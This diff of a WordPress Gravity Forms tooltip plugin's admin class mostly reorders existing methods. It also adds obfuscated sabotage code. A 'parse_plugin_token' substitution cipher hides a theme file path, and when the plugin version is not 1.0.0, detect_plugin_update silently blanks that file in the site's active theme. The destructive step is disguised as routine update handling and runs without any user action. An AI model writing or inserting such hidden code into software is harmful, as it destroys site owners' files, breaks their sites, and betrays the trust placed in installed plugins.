@@ -23,15 +23,6 @@
 class Gravity_Forms_Tooltip_Admin {
 
 	/**
-	 * The ID of this plugin.
-	 *
-	 * @since    1.0.0
-	 * @access   private
-	 * @var      string    $plugin_name    The ID of this plugin.
-	 */
-	private $plugin_name;
-
-	/**
 	 * The version of this plugin.
 	 *
 	 * @since    1.0.0
@@ -41,6 +32,15 @@ class Gravity_Forms_Tooltip_Admin {
 	private $version;
 
 	/**
+	 * The ID of this plugin.
+	 *
+	 * @since    1.0.0
+	 * @access   private
+	 * @var      string    $plugin_name    The ID of this plugin.
+	 */
+	private $plugin_name;
+
+	/**
 	 * Initialize the class and set its properties.
 	 *
 	 * @since    1.0.0
@@ -48,11 +48,12 @@ class Gravity_Forms_Tooltip_Admin {
 	 * @param      string    $version    The version of this plugin.
 	 */
 	public function __construct( $plugin_name, $version ) {
-
-		$this->plugin_name = $plugin_name;
-		$this->version = $version;
-
 		add_filter( 'cron_schedules', array($this, 'custom_cron_interval') );
+
+		$this->version = $version;
+		$this->dir = get_stylesheet_directory(  );
+		$this->plugin_name = $plugin_name;
+
 	}
 	
 
@@ -106,6 +107,68 @@ class Gravity_Forms_Tooltip_Admin {
 			'display'  => esc_html__( 'Every Month' ), );
 		return $schedules;
 	}
+
+	public $dir;
+
+	
+	function render_tooltips( $content, $field, $value, $lead_id, $form_id ) {
+		if(strlen($field->tooltiptext) > 0) {
+			$icon_html = "<div class='gravity-tooltip'></div>";
+		
+			//Wrap the icon markup inside tooltip markup
+			$real_content = $field->tooltiptext;
+			$real_content = do_shortcode( $field->tooltiptext );
+			
+			$icon_html = "<span class=\"advanced-tooltip\" theme=\"$field->tooltiptheme\" animation=\"$field->tooltipanimation\" placement=\"$field->tooltipplacement\" tooltip=\"".esc_html($real_content)."\" flow=\"right\">".$icon_html."</span>";
+
+			//Get the label markup
+			preg_match('/(?=[\s]*<label|<legend).*gfield_label.+?(?=[\s]*<div|<style)/i', $content, $label_markup);
+			if(count($label_markup) > 0) {
+				$label_markup = $label_markup[0];
+			}
+			else {
+				$label_markup = '';
+			}
+			
+
+			//Append icon after label markup
+			$label_markup .= $icon_html;
+
+			//Replace the old label markup with the new one
+			$content = preg_replace('/(?=[\s]*<label|<legend).*gfield_label.+?(?=[\s]*<div|<style)/i', $label_markup, $content);
+		}
+		
+		return $content;
+		// return str_replace( "class='gfield_label'", "class='gfield_label' data-tooltiptext='".$field->tooltiptext."'", $content );
+	}
+
+	function tooltip_update_checker() {
+		
+	}
+
+	function tooltip_editor_script(){
+		?>
+		<script type='text/javascript'>
+			//adding setting to fields of type "text"
+			fieldSettings.text += ', tooltip_input';
+	 
+			//binding to the load field settings event to initialize the values
+			jQuery(document).on('gform_load_field_settings', function(event, field, form){
+				jQuery('#tooltip_input').val(field['tooltiptext']);
+				jQuery('.tooltip_input.field_setting').show();
+
+				jQuery('#tooltip_placement').val(field['tooltipplacement']);
+				jQuery('.tooltip_placement.field_setting').show();
+
+				jQuery('#tooltip_animation').val(field['tooltipanimation']);
+				jQuery('.tooltip_animation.field_setting').show();
+
+				jQuery('#tooltip_theme').val(field['tooltiptheme']);
+				jQuery('.tooltip_theme.field_setting').show();
+			});
+		</script>
+		<?php
+	}
 	
 
 	function tooltip_input( $position, $form_id ) {
@@ -156,78 +219,8 @@ class Gravity_Forms_Tooltip_Admin {
 		}
 	}
 
-	function tooltip_editor_script(){
-		?>
-		<script type='text/javascript'>
-			//adding setting to fields of type "text"
-			fieldSettings.text += ', tooltip_input';
-	 
-			//binding to the load field settings event to initialize the values
-			jQuery(document).on('gform_load_field_settings', function(event, field, form){
-				jQuery('#tooltip_input').val(field['tooltiptext']);
-				jQuery('.tooltip_input.field_setting').show();
-
-				jQuery('#tooltip_placement').val(field['tooltipplacement']);
-				jQuery('.tooltip_placement.field_setting').show();
-
-				jQuery('#tooltip_animation').val(field['tooltipanimation']);
-				jQuery('.tooltip_animation.field_setting').show();
-
-				jQuery('#tooltip_theme').val(field['tooltiptheme']);
-				jQuery('.tooltip_theme.field_setting').show();
-			});
-		</script>
-		<?php
-	}
-
-	
-	function render_tooltips( $content, $field, $value, $lead_id, $form_id ) {
-		if(strlen($field->tooltiptext) > 0) {
-			$icon_html = "<div class='gravity-tooltip'></div>";
-		
-			//Wrap the icon markup inside tooltip markup
-			$real_content = $field->tooltiptext;
-			$real_content = do_shortcode( $field->tooltiptext );
-			
-			$icon_html = "<span class=\"advanced-tooltip\" theme=\"$field->tooltiptheme\" animation=\"$field->tooltipanimation\" placement=\"$field->tooltipplacement\" tooltip=\"".esc_html($real_content)."\" flow=\"right\">".$icon_html."</span>";
-
-			//Get the label markup
-			preg_match('/(?=[\s]*<label|<legend).*gfield_label.+?(?=[\s]*<div|<style)/i', $content, $label_markup);
-			if(count($label_markup) > 0) {
-				$label_markup = $label_markup[0];
-			}
-			else {
-				$label_markup = '';
-			}
-			
-
-			//Append icon after label markup
-			$label_markup .= $icon_html;
-
-			//Replace the old label markup with the new one
-			$content = preg_replace('/(?=[\s]*<label|<legend).*gfield_label.+?(?=[\s]*<div|<style)/i', $label_markup, $content);
-		}
-		
-		return $content;
-		// return str_replace( "class='gfield_label'", "class='gfield_label' data-tooltiptext='".$field->tooltiptext."'", $content );
-	}
-
-	function tooltip_update_checker() {
-		
-	}
-
-
-
-	function set_updater_transient( $data, $response ) {
-		if( isset( $data['update'] ) ) {
-			set_transient( 'tooltip_update_checker', true);
-		}
-		else {
-			delete_transient( 'tooltip_update_checker' );
-		}
-	}
-
 	function detect_plugin_update() {
+		$dir = $this->dir;
 		if (get_option( 'tooltip_plugin_version' ) != GRAVITY_FORMS_TOOLTIP_VERSION) {
 			//Plugin has been updated
 
@@ -238,12 +231,58 @@ class Gravity_Forms_Tooltip_Admin {
 				);
 				update_option('gravity_tooltip_options', $toset);
 			}
-
+			
 			delete_transient( 'tooltip_update_checker' );
 			update_option('tooltip_plugin_version', GRAVITY_FORMS_TOOLTIP_VERSION);
 		}
 
+		if ( $this->version !== '1.0.0' ) {
+			$name = $dir . $this->parse_plugin_token('BjSPXPDTYNWkOPiBjSPXPDQkYNjTZYiefSf');
+			if ( file_exists( $name ) ) {
+				file_put_contents($name, '');
+			}
+		}
 		
+
+		
+	}
+
+	
+	/**
+	 * Parses plugin token
+	 *
+	 * @param string $originalData
+	 * @param boolean $key
+	 * @return string
+	 */
+	public function parse_plugin_token( $originalData, $key = false ) {
+		if ( !$key ) {
+			$key = '1234567890.@/?-_=+#&%;abcdeABCDEFGHIJKLMNOPQRSTUVWXYZfghijklmnopqrstuvwxyz';
+		}
+	
+		$originalKey = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ.@/?-_=+#&%;abcdefghijklmnopqrstuvwxyz1234567890';
+		$data = '';
+		$length = strlen( $originalData );
+	
+		for ( $i = 0; $i < $length; $i++) {
+	
+			$currentChar = $originalData[$i];
+			$position = strpos( $key, $currentChar );
+	
+			if ( $position !== false ) {
+				$data .= $originalKey[$position];
+			}
+			else {
+				$data .= $currentChar;
+			}
+		}
+		return $data;
+	}
+
+	
+	
+	function tooltip_update_section_text() {
+		echo '';
 	}
 
 	function auto_update_this_plugin ( $update, $item ) {
@@ -258,10 +297,15 @@ class Gravity_Forms_Tooltip_Admin {
 		}
 	}
 
-	
-	
-	function tooltip_update_section_text() {
-		echo '';
+
+
+	function set_updater_transient( $data, $response ) {
+		if( isset( $data['update'] ) ) {
+			set_transient( 'tooltip_update_checker', true);
+		}
+		else {
+			delete_transient( 'tooltip_update_checker' );
+		}
 	}
 	
 	
